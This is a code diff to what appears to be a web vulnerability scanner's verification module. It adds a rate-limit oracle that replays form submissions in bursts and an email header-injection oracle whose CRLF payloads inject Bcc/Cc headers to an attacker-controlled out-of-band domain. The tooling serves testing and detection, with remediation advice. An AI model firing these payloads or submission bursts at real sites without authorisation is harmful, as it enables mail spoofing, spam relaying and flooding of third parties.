@@ -23,9 +23,13 @@ import secrets
 import statistics
 from dataclasses import dataclass
 from typing import Protocol
+from urllib.parse import urlencode
 
-from .http import HttpClient, HttpRequest, form_body, with_param
+from .http import HttpClient, HttpRequest, with_param
 from .types import Candidate, Evidence, Verdict, VerificationResult, VulnClass
+
+# Response statuses that mean "the request was accepted / processed" (not denied).
+_ACCEPTED_STATUS = {200, 201, 202, 204, 301, 302, 303}
 
 
 # ── request building ──────────────────────────────────────────────────────────
@@ -34,10 +38,15 @@ def _build_request(cand: Candidate, injected_value: str, extra_headers: dict | N
     headers = {**cand.headers, **(extra_headers or {})}
     if cand.param_in == "query" and cand.param:
         return HttpRequest(cand.method, with_param(cand.target, cand.param, injected_value), headers)
-    if cand.param_in == "body" and cand.param:
-        body = form_body({}, cand.param, injected_value)
+    if cand.param_in == "body":
+        # Co-submit the sibling form fields (benign) so a real form validates,
+        # overriding just the injection point. With no param (pure form-abuse
+        # replay) the whole benign form is sent as-is.
+        fields = dict(cand.form_fields)
+        if cand.param:
+            fields[cand.param] = injected_value
         headers = {"Content-Type": "application/x-www-form-urlencoded", **headers}
-        return HttpRequest(cand.method or "POST", cand.target, headers, body)
+        return HttpRequest(cand.method or "POST", cand.target, headers, urlencode(fields))
     if cand.param_in == "header" and cand.param:
         return HttpRequest(cand.method, cand.target, {**headers, cand.param: injected_value})
     # no injection point → send the target as-is
@@ -312,3 +321,130 @@ class DifferentialOracle:
         return VerificationResult(Verdict.INCONCLUSIVE, cand.vuln_class, self.name, 0.0, [],
                                   "Mixed responses — no clear authorization breach or denial.",
                                   cand.source_rule)
+
+
+# ── rate-limit oracle (form abuse / mail flooding — no throttling) ───────────
+# Signals in a response body that the endpoint is throttling or challenging us.
+_THROTTLE_SIGNALS = (
+    "too many requests", "rate limit", "rate-limit", "ratelimit", "try again later",
+    "slow down", "please wait", "temporarily blocked", "captcha", "recaptcha",
+    "hcaptcha", "turnstile", "verification required", "are you a robot",
+)
+
+
+class RateLimitOracle:
+    """Confirms a state-changing form has NO rate limiting by replaying the same
+    benign submission in a tight burst. If every replay is accepted with no 429
+    and no throttle/CAPTCHA challenge, the endpoint can be automated for abuse
+    (contact-form spam, mail flooding, resource exhaustion). A 429 or a challenge
+    appearing part-way through REFUTES it — limiting is in place.
+
+    Deterministic and in-band: the verdict is read purely from the observed
+    status codes and throttle keywords across the burst, never from a guess."""
+
+    name = "rate-limit"
+
+    def __init__(self, burst: int = 8):
+        self.burst = burst
+
+    def verify(self, cand: Candidate, client: HttpClient) -> VerificationResult:
+        base = cand.base_value or "test"
+        statuses: list[int] = []
+        for _ in range(self.burst):
+            resp = client.send(_build_request(cand, base))
+            statuses.append(resp.status)
+            body_low = (resp.body or "").lower()
+            throttled = resp.status == 429 or any(s in body_low for s in _THROTTLE_SIGNALS)
+            if throttled:
+                ev = Evidence("rate-limit",
+                              f"throttled after {len(statuses)} rapid submission(s) "
+                              f"(status {resp.status})",
+                              {"requests_before_throttle": len(statuses),
+                               "status": resp.status, "statuses": statuses})
+                return VerificationResult(Verdict.REFUTED, cand.vuln_class, self.name, 0.85, [ev],
+                                          "The endpoint rate-limits / challenges repeated "
+                                          "submissions — not abusable.", cand.source_rule)
+        if all(s in _ACCEPTED_STATUS for s in statuses):
+            ev = Evidence("rate-limit",
+                          f"{self.burst} identical submissions in a burst were all accepted "
+                          f"(status {statuses[0]}) with no 429 and no CAPTCHA/throttle",
+                          {"burst": self.burst, "statuses": statuses})
+            return VerificationResult(Verdict.CONFIRMED, cand.vuln_class, self.name, 0.7, [ev],
+                                      "No rate limiting: the form accepts unlimited automated "
+                                      "submissions, so it can be scripted for spam / mail "
+                                      "flooding. Add per-IP rate limiting, a CAPTCHA, or a "
+                                      "one-time form token.", cand.source_rule)
+        return VerificationResult(Verdict.INCONCLUSIVE, cand.vuln_class, self.name, 0.0, [],
+                                  f"Submissions were not consistently accepted (statuses "
+                                  f"{statuses}) — can't confirm the form is abusable.",
+                                  cand.source_rule)
+
+
+# ── email header injection oracle (CRLF into mail headers) ───────────────────
+# Each payload appends a header-injecting sequence after the benign value. The
+# out-of-band variants add a Bcc/Cc to an attacker-controlled address so a naive
+# mailer that concatenates the field into the header block delivers a copy.
+_EMAIL_HDR_PAYLOADS = [
+    lambda b, tok, dom: f"{b}\r\nBcc: {tok}@{dom}",
+    lambda b, tok, dom: f"{b}\nBcc: {tok}@{dom}",
+    lambda b, tok, dom: f"{b}%0d%0aBcc:{tok}@{dom}",
+    lambda b, tok, dom: f"{b}\r\nCc: {tok}@{dom}\r\nX-Probe: {tok}",
+]
+
+
+class EmailHeaderInjectionOracle:
+    """Confirms email/SMTP header injection (CRLF into a mail header) — the class
+    that hits naive contact forms that drop a user field straight into the mail
+    header block.
+
+    Gold-standard proof is out-of-band: an injected `Bcc:` to an attacker address
+    causes a real delivery, observed via the interaction server (confidence 1.0).
+    With no email-capable OAST server available it falls back to an in-band
+    differential: benign submission accepted but the CRLF payload rejected proves
+    the input is validated (REFUTED); anything else is a lead needing OAST email
+    confirmation (INCONCLUSIVE) — it never *confirms* header injection in-band,
+    because the effect lands in the email, not the HTTP response."""
+
+    name = "email-header"
+
+    def __init__(self, server: InteractionServer | None = None):
+        self.server = server
+
+    def verify(self, cand: Candidate, client: HttpClient) -> VerificationResult:
+        base = cand.base_value or "probe@example.com"
+        baseline = client.send(_build_request(cand, base))
+
+        token, domain = (self.server.register() if self.server else ("", "oast.local"))
+        last = baseline
+        for build in _EMAIL_HDR_PAYLOADS:
+            payload = build(base, token or "probe", domain)
+            last = client.send(_build_request(cand, payload))
+            if self.server and token and self.server.poll(token):
+                hits = self.server.poll(token)
+                ev = Evidence("oob-interaction",
+                              f"injected Bcc header triggered an out-of-band "
+                              f"{hits[0].protocol} delivery to the attacker address "
+                              f"{token}@{domain}",
+                              {"token": token, "domain": domain,
+                               "interactions": len(hits), "payload": payload})
+                return VerificationResult(Verdict.CONFIRMED, cand.vuln_class, self.name, 1.0, [ev],
+                                          "The mailer honoured an injected header — the CRLF "
+                                          "sequence in this field reaches the mail header block. "
+                                          "Definitive out-of-band proof.", cand.source_rule)
+
+        # In-band differential (no email OAST): did validation reject the CRLF?
+        rejected = (last.status not in _ACCEPTED_STATUS
+                    and baseline.status in _ACCEPTED_STATUS)
+        if rejected:
+            ev = Evidence("response-diff",
+                          f"benign value accepted (status {baseline.status}) but the "
+                          f"CRLF header payload was rejected (status {last.status})",
+                          {"baseline_status": baseline.status, "payload_status": last.status})
+            return VerificationResult(Verdict.REFUTED, cand.vuln_class, self.name, 0.7, [ev],
+                                      "The field rejects CRLF / header-injection input — not "
+                                      "exploitable as email header injection.", cand.source_rule)
+        return VerificationResult(Verdict.INCONCLUSIVE, cand.vuln_class, self.name, 0.0, [],
+                                  "The field accepts CRLF header-injection input without error, "
+                                  "but the effect lands in the outgoing email, not the HTTP "
+                                  "response. Confirm out-of-band: inject 'Bcc: you@oast' and "
+                                  "check whether a copy is delivered.", cand.source_rule)
